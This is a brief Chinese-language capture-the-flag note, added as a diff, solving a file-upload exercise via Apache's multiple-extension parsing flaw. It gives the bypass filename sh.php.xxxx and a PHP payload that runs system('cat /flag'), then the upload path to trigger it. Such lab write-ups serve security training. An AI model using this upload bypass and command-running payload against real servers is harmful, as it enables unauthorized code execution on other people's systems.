@@ -1,0 +1,8 @@
+# 簡單上傳漏洞練習 (Apache解析漏洞)
+
+上傳 sh.php.xxxx
+內容為
+<?php
+system("cat /flag");
+
+訪問/upload/sh.php.xxxx 即可拿到FLAG
